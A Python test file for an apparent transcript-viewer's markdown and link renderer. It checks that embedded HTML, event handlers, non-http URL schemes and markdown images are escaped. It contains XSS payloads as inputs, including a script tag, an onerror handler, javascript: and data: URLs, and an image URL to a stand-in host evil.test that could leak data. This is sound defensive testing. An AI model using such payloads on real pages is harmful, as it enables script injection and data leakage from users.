"""What a transcript's own text is allowed to do once it reaches a page: nothing.

Every input here is invented markup, and it has to be — redaction flattens every string in
the fixture corpus, so no recorded session can carry a payload. These are the inner of the
two escaping layers the design names; the outer one is the planted-sentinel route test in
`tests/view/test_app.py`, which sees what a template does after `render.py` is done.
"""

from aiobserve.view import render


def test_html_in_markdown_source_arrives_as_text() -> None:
    """A `<script>` a transcript wrote renders as the characters, never as an element.

    markdown-it-py's `commonmark` preset turns HTML passthrough *on*, so this pin is one
    constructor argument away from being undone and nothing else in the suite would notice.
    """
    rendered = render.markdown("before\n\n<script>alert(1)</script>\n\nafter")
    # The markup is text on the page...
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in rendered
    # ...and no part of it is an element the browser would run.
    assert "<script" not in rendered
    # The markdown around it still renders, so the pin costs the reader nothing.
    assert "<p>before</p>" in rendered


def test_an_inline_html_attribute_cannot_ride_in_either() -> None:
    """Passthrough is off inline as well as in a block: an `onerror` handler is text."""
    rendered = render.markdown("a paragraph with <img src=x onerror=alert(1)> in it")
    assert "<img" not in rendered
    assert "onerror=alert(1)&gt;" in rendered


def test_markdown_image_syntax_fetches_nothing() -> None:
    """`![](host)` renders a placeholder, so a transcript cannot make the browser call out.

    This is a second, independent hole: an `<img src>` the page emits is a request the
    browser makes on load, with no click and no HTML passthrough involved. The CSP header is
    the other wall behind it. Note the `href` assertion — simply *disabling* the image rule
    hands the syntax to the link rule, which puts the same host back in an attribute.
    """
    rendered = render.markdown("![pixel](https://evil.test/px?d=1)")
    # No image element, and the host reaches no attribute of anything else either...
    assert "<img" not in rendered
    assert 'src="' not in rendered
    assert 'href="' not in rendered
    # ...while alt text and URL stay visible as text, so a reader sees what was written.
    assert "[image: pixel — https://evil.test/px?d=1]" in rendered


def test_a_bare_url_does_not_become_a_link() -> None:
    """Linkify is off: text that looks like a URL stays text."""
    rendered = render.markdown("see https://evil.test/path for details")
    assert 'href="http' not in rendered
    assert "https://evil.test/path" in rendered


def test_only_an_http_url_becomes_a_link() -> None:
    """A URL a browser should follow is a link; every other scheme is shown as text."""
    # An http or https URL reaches the `href`, upper-case scheme and all...
    assert 'href="https://example.test/pr/1"' in render.link("https://example.test/pr/1")
    assert 'href="HTTP://example.test/"' in render.link("HTTP://example.test/")
    # ...while a scheme that runs or reads something local never does, though the reader still
    # sees what the transcript wrote.
    for url in ("javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "file:///etc"):
        shown = render.link(url)
        assert "href" not in shown
        assert "<script>" not in shown
        assert url.split(":")[0] in shown
    # A quote in a URL cannot close the attribute it lands in.
    assert 'href="https://example.test/?q=&#34;' in render.link('https://example.test/?q="')


def test_an_absent_value_renders_to_nothing() -> None:
    """A NULL column reaches the template as None, and an empty block beats a crash."""
    assert render.markdown(None) == ""
    assert render.link(None) == ""
